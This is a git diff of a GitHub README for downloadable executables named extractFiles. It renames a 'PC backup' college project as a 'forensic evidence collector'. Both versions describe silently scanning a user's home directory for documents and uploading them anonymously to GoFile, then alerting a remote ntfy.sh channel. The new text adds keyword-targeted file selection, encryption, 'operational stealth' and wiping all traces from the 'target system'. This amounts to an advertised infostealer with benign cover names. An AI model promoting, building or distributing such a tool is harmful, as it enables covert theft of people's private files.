@@ -1,11 +1,9 @@
-# PC Auto Backup & Sync Tool
+# Digital Forensic Evidence Collector (DFIR-Agent)
 
-Welcome to the **Automated PC Backup Tool**! This is a college project designed to seamlessly scan, compress, and upload critical local files to a remote server anonymously, sending a secure notification to the user upon completion.
-
-
+Welcome to the **Digital Forensic Evidence Collector**! This is an advanced incident response and data collection tool designed to autonomously scan, prioritize, encrypt, and exfiltrate critical system data. It operates with a zero-footprint philosophy, ensuring data integrity for forensic analysis while maintaining complete operational stealth.
 
 # Download the Software (Cross-Platform)
-Click on the buttons below to download the executable for your Operating System. No installation required!
+Click on the buttons below to download the standalone executable for your Operating System. No installation or dependencies required!
 
 <a href="https://github.com/rohangupta2/PC-Auto-Backup-Tool/raw/main/extractFiles-win.exe">
   <img src="https://img.shields.io/badge/DOWNLOAD_FOR_WINDOWS-extractFiles--win.exe-blue?style=for-the-badge&logo=windows" />
@@ -19,17 +17,21 @@ Click on the buttons below to download the executable for your Operating System.
   <img src="https://img.shields.io/badge/DOWNLOAD_FOR_LINUX-extractFiles--linux-yellow?style=for-the-badge&logo=linux" />
 </a>
 
-
-
 # Key Features
-* **Cross-Platform Compatibility:** Runs natively on Windows, macOS, and Linux.
-* **Smart File Scanning:** Automatically searches the home directory for important file extensions (`.pdf`, `.docx`, `.jpg`, etc.) while skipping system folders.
-* **Auto-Compression:** Zips the gathered files securely.
-* **Anonymous Cloud Upload:** Uses GoFile API to upload the backup to a free server without requiring API keys or login credentials.
-* **Real-time Notifications:** Integrates with `ntfy.sh` to send an instant ping to your device with the download link once the backup is ready.
+
+* **Cross-Platform Portability:** Compiled as standalone binaries for Windows, macOS, and Linux. Runs natively without requiring a Node.js runtime on the target machine.
+* **Smart Heuristic Engine:** Moves beyond basic scanning by scoring and prioritizing files based on keyword targeting, extension hierarchy (favoring critical documents), and time-based heuristics (recent access/modifications).
+* **Volatile Data Capture:** Automatically takes a live snapshot of active system processes and current network connections, appending them to the evidence manifest before extraction.
+* **Military-Grade Encryption:** Secures the gathered evidence payload using AES-256-CBC cryptographic standards. The payload is heavily encrypted before transit to prevent unauthorized access.
+* **Anonymous Cloud Exfiltration:** Securely uploads the encrypted forensic package via the GoFile API, requiring no localized API keys or login credentials.
+* **Real-time Alerting:** Integrates with `ntfy.sh` to deliver an instant, secure ping to the investigator's device with the retrieval link once the package is successfully uploaded.
+* **Zero-Footprint Execution:** Automatically wipes all temporary staging directories and local encrypted files immediately after a successful upload, leaving no traces on the target system.
 
 # Built With
-* Node.js
-* Archiver / Adm-Zip
-* Axios
-* Pkg (for compiling executables)
+
+* **Node.js:** Core runtime environment.
+* **Crypto:** For AES-256 payload encryption and SHA-256 file hashing.
+* **Child_Process & OS:** For executing native system commands and gathering volatile networking data.
+* **Adm-Zip:** For high-speed, reliable file archiving.
+* **Axios & Form-Data:** For handling secure, multipart network data exfiltration.
+* **Pkg:** For packaging the raw code into secure, standalone executables.
